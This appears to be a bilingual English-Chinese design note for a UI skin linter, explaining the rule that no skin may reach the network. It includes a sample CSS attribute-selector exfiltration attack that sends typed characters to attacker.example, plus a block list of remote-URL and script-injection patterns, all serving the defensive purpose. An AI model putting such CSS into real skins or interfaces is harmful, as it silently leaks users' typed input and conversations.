# Why a stylesheet needs a linter · 为什么一个样式表需要检查器

A skin is not a document you open. It is code injected into a running interface, next to whatever
you are typing there. "It's only CSS" is the reason this gets waved through, and it is wrong.

皮肤不是你打开来看的文档，它是被注入进一个正在运行的界面里的代码，就在你正在输入的东西旁边。
「不过是 CSS 而已」正是它被放行的原因，而这句话是错的。

## The attack · 攻击

```css
input[value^="a"] { background: url(https://attacker.example/log?c=a); }
input[value^="b"] { background: url(https://attacker.example/log?c=b); }
/* … 一直到 z、0-9、以及每一个你想要的字符 */
```

An attribute selector matches on the *current value* of the field. A match fires the background
request. Repeat with `value^="aa"`, `value^="ab"`, … and the attacker reconstructs the string one
character at a time. No JavaScript, no network permission prompt, no visible change on screen.

属性选择器匹配的是输入框**当前的值**；匹配上就发出那个背景请求。再用 `value^="aa"`、`value^="ab"`
铺开，攻击者就一个字符一个字符地把内容拼回来。全程没有 JavaScript、没有权限弹窗、屏幕上什么都看不出来。

The same trick reads anything the DOM exposes as an attribute: `title`, `alt`, `aria-label`,
`href`, `placeholder`. In a chat client that is enough to leak the conversation.
同样的手法能读到任何以属性形式存在的内容 —— 在一个聊天客户端里，这足够把对话内容漏出去。

## The rule that follows · 由此得到的规则

**No skin reaches the network.** Not "no JavaScript in skins" — that misses the whole attack. Remote
URLs *are* the vulnerability, so every path to one is an `error`:

规则不是「皮肤里别写 JS」—— 那条完全没盖住这个攻击。**远程 URL 本身就是漏点**，所以每一条通往它的路都是 error：

| rule | blocks |
|---|---|
| `remote-url` | `url(https://…)`, `url(//…)` |
| `remote-import` | `@import url(https://…)` |
| `remote-font` | `@font-face { src: url(https://…) }` |
| `script-injection` | `<script`, `javascript:`, `expression()` |
| `legacy-behavior` | `-moz-binding`, `behavior:` — script execution in older engines |

`attribute-value-selector` is reported as a **warning**, not an error: on its own it is legitimate
CSS that plenty of honest skins use. It is the *combination* with a remote URL that is the exploit,
and the remote URL half is already blocked. Flagging the selector anyway means a reviewer looking at
a skin can see the shape of the attack even when only half of it is present.

`attribute-value-selector` 只报 warning：它本身是正当写法，很多正经皮肤都在用。构成漏洞的是它
**和远程 URL 的组合**，而那一半已经被拦死了。仍然标出来，是为了让人在只看到一半时也认得出形状。

## Where the block happens · 拦在哪里

Not in the UI. Every consumer runs the linter before the CSS becomes injectable:

不在界面上拦。每一个消费方都在 CSS 变成可注入之前先跑一遍检查：

- **The app** — `skins.compile()` returns `null` instead of CSS. There is no "apply anyway" button.
  A skin with an error still renders in the studio preview, because an author has to see what they
  are fixing; what is refused is *injecting it into someone else's interface*.
- **`@dsh-skin/host`** — `apply()` resolves `{ ok: false, error }` and inserts nothing.
- **The DSH adapter** — the local asset server answers `409` with the findings in the response body,
  so a stale browser-side picker cannot route around it.
- **CI** — `dsh-skin validate` exits 1.

## What this does not protect against · 它挡不住的

Be clear about the boundary:

- **Ugly is not unsafe.** The linter has no opinion about whether a skin is readable.
- **Local assets are trusted.** A skin can ship any image it likes; nothing scans image contents.
- **The host is still the host.** If the application you are skinning is compromised, a skin cannot
  save you — and `dsh-skin` never injects scripts, so it cannot make that worse either.
- **`bypassCSP`.** The custom protocol is registered with `bypassCSP: true`, which is what lets a
  skin's images load into a page that has its own strict CSP. The handler only serves files that
  resolve inside a known skin directory (symlinks followed, `..` rejected), but a page loaded in a
  shell window can fetch those files. Don't put anything secret in a skin folder.

## Reporting · 报告问题

Found a way past the linter? See [SECURITY.md](../SECURITY.md). Please don't open a public issue
with a working exfiltration payload before it is fixed.
